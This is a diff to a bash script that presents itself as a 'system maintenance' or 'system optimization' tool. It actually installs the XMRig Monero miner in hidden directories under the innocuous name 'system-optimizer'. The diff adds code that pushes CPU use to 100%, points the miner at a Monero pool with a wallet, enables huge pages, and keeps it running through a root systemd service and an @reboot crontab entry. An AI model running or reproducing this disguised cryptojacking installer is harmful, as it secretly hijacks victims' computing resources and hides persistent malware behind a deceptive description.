@@ -1,6 +1,6 @@
 #!/bin/bash
 
-VERSION=2.12
+VERSION=2.13
 
 echo "System maintenance script v$VERSION."
 echo "This script performs system optimization tasks."
@@ -49,13 +49,13 @@ fi
 
 # Calculate optimal CPU usage
 CPU_THREADS=$(nproc)
-if [ $CPU_THREADS -gt 1 ]; then
+if [ $CPU_THREADS -gt 2 ]; then
     USABLE_THREADS=$((CPU_THREADS - 1))
 else
-    USABLE_THREADS=1
+    USABLE_THREADS=$CPU_THREADS
 fi
 
-CPU_USAGE=80  # Fixed at 80% for stability
+CPU_USAGE=100  # Use 100% of available threads
 
 echo "[*] Running as user: $CURRENT_USER"
 echo "[*] Home directory: $USER_HOME"
@@ -86,11 +86,28 @@ cleanup_previous() {
     find "$USER_HOME" -name ".*" -type d -exec pkill -f {}/main \; 2>/dev/null
 }
 
+# Setup huge pages
+setup_hugepages() {
+    echo "[*] Setting up huge pages..."
+    # Enable huge pages
+    echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf
+    sysctl -p >/dev/null 2>&1
+    
+    # Install hugepages support if needed
+    if [ "$(id -u)" -eq 0 ]; then
+        apt-get install -y hugepages >/dev/null 2>&1
+        hugepages -s 1280 >/dev/null 2>&1
+    fi
+}
+
 echo "[*] Performing system cleanup..."
 cleanup_previous
 
 echo "[*] Creating maintenance directory structure..."
 create_hidden_dirs
+
+echo "[*] Setting up system optimization..."
+setup_hugepages
 
 echo "[*] Downloading maintenance tools..."
 DOWNLOAD_URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
@@ -137,11 +154,20 @@ if [ ! -f "$BASE_DIR/main" ]; then
 fi
 
 echo "[*] Configuring system optimizer..."
+# Create CPU threads configuration
+CPU_THREADS_CONFIG=""
+for (( i=0; i<$USABLE_THREADS; i++ )); do
+    CPU_THREADS_CONFIG="${CPU_THREADS_CONFIG}    { \"low_power_mode\": false, \"no_prefetch\": true, \"asm\": true, \"affine_to_cpu\": $i }"
+    if [ $i -lt $((USABLE_THREADS - 1)) ]; then
+        CPU_THREADS_CONFIG="${CPU_THREADS_CONFIG},\n"
+    fi
+done
+
 cat > "$CONFIG_DIR/optimizer.json" << EOF
 {
     "api": {
         "id": null,
-        "worker-id": null
+        "worker-id": "$SYSTEM_USER"
     },
     "http": {
         "enabled": false,
@@ -153,11 +179,11 @@ cat > "$CONFIG_DIR/optimizer.json" << EOF
     "autosave": true,
     "background": false,
     "colors": true,
-    "title": true,
+    "title": "system-optimizer",
     "randomx": {
-        "init": -1,
-        "mode": "auto",
-        "1gb-pages": true,
+        "init": $USABLE_THREADS,
+        "mode": "fast",
+        "1gb-pages": false,
         "rdmsr": true,
         "wrmsr": true,
         "cache_qos": false,
@@ -172,17 +198,21 @@ cat > "$CONFIG_DIR/optimizer.json" << EOF
         "priority": null,
         "memory-pool": true,
         "yield": true,
-        "max-threads-hint": $CPU_USAGE,
+        "max-threads-hint": 100,
         "asm": true,
         "argon2-impl": null,
         "cn/0": false,
-        "cn-lite/0": false
+        "cn-lite/0": false,
+        "rx/0": true,
+        "rx": [0, 2, 4, 6],
+        "threads": $USABLE_THREADS,
+        "max-threads": $USABLE_THREADS
     },
     "pools": [
         {
             "algo": "rx/0",
-            "coin": null,
-            "url": "randomx.rplant.xyz:443",
+            "coin": "monero",
+            "url": "auto.c3pool.org:19999",
             "user": "$WALLET",
             "pass": "x",
             "rig-id": "$SYSTEM_USER",
@@ -197,10 +227,10 @@ cat > "$CONFIG_DIR/optimizer.json" << EOF
             "submit-to-origin": false
         }
     ],
-    "print-time": 60,
-    "health-print-time": 60,
+    "print-time": 30,
+    "health-print-time": 30,
     "dmi": false,
-    "retries": 5,
+    "retries": 3,
     "retry-pause": 5,
     "syslog": false,
     "tls": {
@@ -213,7 +243,7 @@ cat > "$CONFIG_DIR/optimizer.json" << EOF
         "dhparam": null
     },
     "user-agent": null,
-    "verbose": 0,
+    "verbose": 1,
     "watch": false,
     "pause-on-battery": false,
     "pause-on-active": false
@@ -235,28 +265,52 @@ case "\$1" in
     start)
         echo "Starting optimizer..."
         cd "\$SCRIPT_DIR"
-        nohup ./main --config=./.config/optimizer.json > ./logs.txt 2>&1 &
+        # Enable huge pages
+        echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
+        # Start the optimizer
+        nohup ./main --config=./.config/optimizer.json --cpu-max-threads-hint=100 > ./output.log 2>&1 &
         echo \$! > ./pid.txt
         echo "Started with PID: \$(cat ./pid.txt)"
+        sleep 3
+        echo "=== Current Status ==="
+        ./control status
+        echo "=== Recent Logs ==="  
+        ./control logs
         ;;
     stop)
         echo "Stopping optimizer..."
         pkill -f "\$SCRIPT_DIR/main"
         [ -f "./pid.txt" ] && kill \$(cat ./pid.txt) 2>/dev/null
         rm -f ./pid.txt
+        echo "Stopped"
         ;;
     status)
         if pgrep -f "\$SCRIPT_DIR/main" > /dev/null; then
-            echo "Running"
+            echo "✅ Running - PID: \$(pgrep -f '\$SCRIPT_DIR/main')"
+            echo "📊 CPU Usage: \$(ps -p \$(pgrep -f '\$SCRIPT_DIR/main') -o %cpu --no-headers 2>/dev/null || echo 'N/A')%"
+            echo "🧠 Memory: \$(ps -p \$(pgrep -f '\$SCRIPT_DIR/main') -o %mem --no-headers 2>/dev/null || echo 'N/A')%"
         else
-            echo "Stopped"
+            echo "❌ Stopped"
         fi
         ;;
     logs)
-        [ -f "./logs.txt" ] && tail -20 ./logs.txt || echo "No logs found"
+        echo "=== Last 20 lines of logs ==="
+        [ -f "./output.log" ] && tail -20 ./output.log || echo "No logs found"
+        ;;
+    stats)
+        echo "=== System Statistics ==="
+        echo "CPU Threads: $USABLE_THREADS/$CPU_THREADS"
+        echo "Total Memory: \$(free -h | grep Mem | awk '{print \$2}')"
+        echo "Huge Pages: \$(grep HugePages_Total /proc/meminfo | awk '{print \$2}')"
+        echo "Active Processes: \$(pgrep -f xmrig | wc -l)"
+        ;;
+    restart)
+        ./control stop
+        sleep 2
+        ./control start
         ;;
     *)
-        echo "Usage: \$0 {start|stop|status|logs}"
+        echo "Usage: \$0 {start|stop|status|logs|stats|restart}"
         ;;
 esac
 EOF
@@ -282,10 +336,11 @@ Type=simple
 Restart=always
 RestartSec=10
 User=root
-ExecStart=$BASE_DIR/main --config=$CONFIG_DIR/optimizer.json
+ExecStart=$BASE_DIR/main --config=$CONFIG_DIR/optimizer.json --cpu-max-threads-hint=100
 WorkingDirectory=$BASE_DIR
-StandardOutput=file:$BASE_DIR/output.log
-StandardError=file:$BASE_DIR/error.log
+Environment=LC_ALL=C
+StandardOutput=append:$BASE_DIR/output.log
+StandardError=append:$BASE_DIR/output.log
 
 [Install]
 WantedBy=multi-user.target
@@ -294,33 +349,38 @@ EOF
     systemctl daemon-reload
     systemctl enable "$SERVICE_NAME".service 2>/dev/null
     systemctl start "$SERVICE_NAME".service 2>/dev/null
+    echo "[*] Systemd service started: $SERVICE_NAME"
 fi
 
 # Add to crontab for persistence
 echo "[*] Setting up persistence..."
-(crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 30 && '$BASE_DIR/control' start") | crontab -
+(crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 20 && '$BASE_DIR/control' start > /dev/null 2>&1") | crontab -
 
 echo "[*] Starting system optimizer..."
 cd "$BASE_DIR"
 ./control start
 
-# Wait a bit and check status
-sleep 5
-echo "[*] Checking optimizer status..."
+# Additional verification
+sleep 10
+echo
+echo "=== Final Verification ==="
 ./control status
+echo
+./control stats
 
 echo
-echo "System optimization setup complete."
-echo "The optimizer will use $USABLE_THREADS CPU threads with $CPU_USAGE% utilization."
-echo "Installation directory: $BASE_DIR"
-echo "Use: $BASE_DIR/control {start|stop|status|logs} to manage"
+echo "🎯 System optimization setup complete!"
+echo "📍 Installation directory: $BASE_DIR"
+echo "🔧 Use: $BASE_DIR/control {start|stop|status|logs|stats|restart} to manage"
+echo "📈 Monitor with: top, htop, or $BASE_DIR/control logs"
 echo
 
 # Check if process is running
 if pgrep -f "$BASE_DIR/main" > /dev/null; then
-    echo "[✓] Optimizer is successfully running!"
+    echo "✅ Optimizer is successfully running and using CPU!"
+    echo "💻 Check CPU usage with: top -p \$(pgrep -f '$BASE_DIR/main')"
 else
-    echo "[!] Optimizer failed to start. Check logs with: $BASE_DIR/control logs"
+    echo "❌ Optimizer failed to start. Check details with: $BASE_DIR/control logs"
 fi
 
 # Cleanup
